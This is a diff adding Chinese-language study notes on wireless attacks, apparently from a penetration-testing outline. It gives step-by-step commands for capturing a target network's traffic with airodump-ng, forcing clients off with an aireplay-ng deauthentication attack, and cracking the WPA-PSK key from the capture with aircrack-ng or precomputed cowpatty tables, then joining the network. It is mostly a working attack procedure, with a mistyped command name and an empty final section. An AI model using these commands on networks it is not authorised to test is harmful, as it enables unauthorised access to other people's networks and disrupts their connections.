@@ -140,6 +140,52 @@
     4.2. 查看附近wifi
         sudo airodump-ng wlan0mon
     4.3. 破解wpa-psk弱密码
+        4.3.1. 抓取并存储无线网络所有数据包
+            sudo airodump-ng --bssid (AP mac地址) --channel 6 --write WPACrackingDemo wlan0mon
+        4.3.2. 等待新的无线客户端连接AP或者通过断线重连攻击
+            sudo aireplay-ng --deauth 1 -a (使用人 mac地址) wlan0mon --ignore-negative-one
+        4.3.3. 查找数据包文件
+            查看当前目录下，airodump-ng应该生成了一个.cap文件
+        4.3.4. 破解密钥，字典相当重要！！！
+        4.3.5. 使用自带或者自定义字典配合.cap文件破解wifi密码
+            sudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst
+        4.3.6. 注意
+            4.3.6.1. 密码一定要是字典中存在的
+            4.3.6.1. cowpatty工具也可以破解
+    4.4. 加快破解wpa/wpa2 psk
+        4.4.1. 使用genpmk预先根据ssid和wordlist计算PMK
+            genpmk -f (字典名称) -d PMK-Wireless-Lab -s " (无线名称) "
+        4.4.2. 通过计算生成PMK-Wireless-Lab PMK文件
+        4.4.3. 使用cowpatty破解密码
+            cowpatty -d PMK-Wireless-Lab -s " (无限名称) " -r WPACrackingDemo-01.cap
+    4.5. usb无线路由链接WPA网络
+        4.5.1. 创建配置文件
+            network={
+                    ssid="无线名称"
+                    key_mgmt=WPA-PSK
+                    proto=WPA
+                    pairwise=TKIP
+                    group=TKIP
+                    psk="无线密码"
+                    }
+        4.5.2. 链接wpa无线网络
+            woa_supplicant -D wext -i wlan0 -c wpa-supp.conf
+        4.5.3. 链接成功后查看无线网络IP
+            连接成功
+                出现connection to xxx completed
+            以dhcp方式获取无线网络IP地址
+                dhclient3 wlan0
+            查看获取的无线信息
+                cat /var/lib/dhclient/dhclient.leases
+第五章、攻击wlan基础设施
+    5.1.
+
+
+
+
+
+
+
 
 
 
